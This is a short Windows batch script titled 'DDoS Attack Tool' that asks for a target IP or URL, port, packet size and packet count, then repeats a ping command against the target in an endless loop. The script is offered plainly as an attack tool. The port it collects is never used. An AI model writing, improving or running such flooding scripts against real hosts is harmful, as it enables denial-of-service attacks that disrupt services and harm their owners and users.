@echo off
title DDoS Attack
color 0a

:menu
echo
echo ================================
echo DDoS Attack Tool
echo ================================
echo
set /p target=Enter Target IP/URL:
set /p port=Enter Target Port:
set /p size=Enter Packet Size:
set /p count=Enter Number of Packets:

:start
ping %target% -l %size% -n %count%
goto start